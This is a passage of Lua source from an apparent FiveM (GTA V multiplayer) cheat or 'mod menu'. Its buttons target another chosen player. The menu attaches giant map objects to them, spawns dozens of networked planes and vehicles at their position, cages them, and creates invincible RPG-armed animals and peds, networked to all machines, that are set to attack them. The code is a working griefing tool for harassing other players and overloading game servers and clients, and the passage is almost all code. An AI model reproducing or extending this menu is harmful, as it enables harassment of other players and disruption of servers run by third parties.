				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "sc1_08_hdg1"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "ss1_11_slod"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "ar_prop_ar_bblock_huge_05"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "ar_prop_ar_neon_gate4x_03a"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "ar_prop_ar_tube_2x_speed"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "apa_mp_apa_yacht_option2"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Paleto Bay") then
				local hk = "cs1_lod2_01_7_slod3"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Tower 8X") then
				local hk = "ar_prop_ar_cp_tower8x_01a"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Wall") then
				local hk = "stt_prop_stunt_track_start"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Tube") then
				local hk = "stt_prop_stunt_tube_m"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Arrow") then
				local hk = "ar_prop_ar_arrow_wide_xl"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Gat 4X") then
				local hk = "ar_prop_ar_neon_gate4x_01a"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Contanier") then
				local hk = "prop_container_01a"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~AirPort") then
				local hk = "ap1_lod_slod4"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Sea Rock") then
				local hk = "csx_seabed_rock3_"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Boat") then
				local hk = "prop_cj_big_boat"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Sandy Shores Map") then
				local hk = "cs4_lod_01_slod3"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Los Santos City") then
				local hk = "dt1_lod_f1_slod3"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~All Map") then
				local hk = "dt1_21_reflproxy"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~FBI") then
				local hk = "dt1_props_combo0110_slod"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~MazeBank") then
				local hk = "dt1_11_slod1"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Hospital") then
				local hk = "sc1_08_hdg1"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~r~Attack ~s~Rich House") then
				local hk = "ss1_11_slod"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button("~b~Spawn ~s~Big Heli 20x") then
				local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 1, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 2, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 3, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 4, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 5, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 6, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 7, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 8, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 9, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 10, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 11, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 12, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 13, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 14, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 15, 0)
				local pickup = CreateObject(GetHashKey("avenger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("avenger"), 16, 0)
				SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.Button("~b~Spawn ~s~Cars 20x") then
				local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
				local pickup = CreateObject(GetHashKey("exemplar"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("exemplar"), 1, 0)
				local pickup = CreateObject(GetHashKey("windsor2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("windsor2"), 2, 0)
				local pickup = CreateObject(GetHashKey("jackal"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("jackal"), 3, 0)
				local pickup = CreateObject(GetHashKey("oracle"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("oracle"), 4, 0)
				local pickup = CreateObject(GetHashKey("blista"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("blista"), 5, 0)
				local pickup = CreateObject(GetHashKey("prairie"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("prairie"), 6, 0)
				local pickup = CreateObject(GetHashKey("felon2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("felon2"), 7, 0)
				local pickup = CreateObject(GetHashKey("riot"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("riot"), 8, 0)
				local pickup = CreateObject(GetHashKey("riot2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("riot2"), 9, 0)
				local pickup = CreateObject(GetHashKey("ambulance"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("ambulance"), 10, 0)
				local pickup = CreateObject(GetHashKey("firetruk"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("firetruk"), 11, 0)
				local pickup = CreateObject(GetHashKey("pbus"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("pbus"), 12, 0)
				local pickup = CreateObject(GetHashKey("chino"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("chino"), 13, 0)
				local pickup = CreateObject(GetHashKey("chino2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("chino2"), 14, 0)
				local pickup = CreateObject(GetHashKey("moonbeam2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("moonbeam2"), 15, 0)
				local pickup = CreateObject(GetHashKey("imperator"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("imperator"), 16, 0)
				SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.Button("~b~Spawn ~s~Another Big Plane 20x") then
				local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 1, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 2, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 3, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 4, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 5, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 6, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 7, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 8, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 9, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 10, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 11, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 12, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 13, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 14, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 15, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 16, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 17, 0)
				local pickup = CreateObject(GetHashKey("bombushka"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("bombushka"), 18, 0)
				SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.Button("~b~Spawn ~s~Cargoplane 20x") then
				local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
				local pickup = CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 1, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 1, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 2, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 3, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 4, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 5, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 6, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 7, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 8, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 1, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 1, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 11, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 12, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 13, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 14, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 15, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 16, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 17, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 18, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 19, 0)
				CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 20, 0)
				SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.Button("~b~Spawn ~s~Police Cars 20x") then
				local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
				local pickup = CreateObject(GetHashKey("cargoplane"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("cargoplane"), 1, 0)
				CreateObject(GetHashKey("ambulance"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("ambulance"), 1, 0)
				CreateObject(GetHashKey("fbi"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("fbi"), 2, 0)
				CreateObject(GetHashKey("fbi2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("fbi2"), 3, 0)
				CreateObject(GetHashKey("firetruk"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("firetruk"), 4, 0)
				CreateObject(GetHashKey("lguard"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("lguard"), 5, 0)
				CreateObject(GetHashKey("pbus"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("pbus"), 6, 0)
				CreateObject(GetHashKey("police"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("police"), 7, 0)
				CreateObject(GetHashKey("police2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("police2"), 8, 0)
				CreateObject(GetHashKey("police3"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("police3"), 1, 0)
				CreateObject(GetHashKey("police4"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("police4"), 1, 0)
				CreateObject(GetHashKey("policeb"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("policeb"), 11, 0)
				CreateObject(GetHashKey("polmav"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("polmav"), 12, 0)
				CreateObject(GetHashKey("policeold1"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("policeold1"), 13, 0)
				CreateObject(GetHashKey("policeold2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("policeold2"), 14, 0)
				CreateObject(GetHashKey("policet"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("policet"), 15, 0)
				CreateObject(GetHashKey("pranger"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("pranger"), 16, 0)
				CreateObject(GetHashKey("predator"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("predator"), 17, 0)
				CreateObject(GetHashKey("riot"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("riot"), 18, 0)
				CreateObject(GetHashKey("sheriff"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("sheriff"), 19, 0)
				CreateObject(GetHashKey("sheriff2"), hn.x, hn.y, hn.z + 0.0, 1, 1, GetHashKey("sheriff2"), 20, 0)
				SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.Button("~r~Cage ~s~Player") then
				x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
				roundx = tonumber(string.format("%.2f", x))
				roundy = tonumber(string.format("%.2f", y))
				roundz = tonumber(string.format("%.2f", z))
				local ho = "prop_fnclink_05crnr1"
				local gZ = GetHashKey(ho)
				RequestModel(gZ)
				while not HasModelLoaded(gZ) do
					Citizen.Wait(0)
				end;
				local h6 = CreateObject(gZ, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
				local h7 = CreateObject(gZ, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
				SetEntityHeading(h6, -90.0)
				SetEntityHeading(h7, 90.0)
				FreezeEntityPosition(h6, true)
				FreezeEntityPosition(h7, true)
			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Dolphins  with ~y~RPG") then
				local hp = "a_c_dolphin"
				local bR = "weapon_rpg"
				for i = 0, 10 do
					local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey(hp))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(hp)) then
						local ped = CreatePed(21, GetHashKey(hp), hn.x + i, hn.y - i, hn.z, 0, true, true) and CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							Citizen.Wait(50)
							NetToPed(hf)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetEntityInvincible(ped, true)
							SetPedCanSwitchWeapon(ped, true)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, hn.x, hn.y, hn.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Naked Peds with ~y~RPG") then
				local hp = "a_m_m_acult_01"
				local bR = "weapon_rpg"
				for i = 0, 10 do
					local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey(hp))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(hp)) then
						local ped = CreatePed(21, GetHashKey(hp), hn.x + i, hn.y - i, hn.z, 0, true, true) and CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						CreatePed(21, GetHashKey(hp), hn.x - i, hn.y + i, hn.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							Citizen.Wait(50)
							NetToPed(hf)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetEntityInvincible(ped, true)
							SetPedCanSwitchWeapon(ped, true)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, hn.x, hn.y, hn.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Small ~y~Monkeys") then
				local hp = "a_c_rhesus"
				local bR = "weapon_rpg"
				for i = 0, 10 do
					local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey(hp))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(hp)) then
						local ped = CreatePed(21, GetHashKey(hp), hn.x + i, hn.y - i, hn.z + 15, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							Citizen.Wait(50)
							NetToPed(hf)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetEntityInvincible(ped, true)
							SetPedCanSwitchWeapon(ped, true)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, hn.x, hn.y, hn.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Boar  ~y~With Rpg") then
				local hp = "a_c_boar"
				local bR = "weapon_rpg"
				for i = 0, 10 do
					local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey(hp))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(hp)) then
						local ped = CreatePed(21, GetHashKey(hp), hn.x + i, hn.y - i, hn.z + 15, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							Citizen.Wait(50)
							NetToPed(hf)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetEntityInvincible(ped, true)
							SetPedCanSwitchWeapon(ped, true)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, hn.x, hn.y, hn.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Rat  ") then
				local hp = "a_c_rat"
				for i = 0, 10 do
					local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey(hp))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(hp)) then
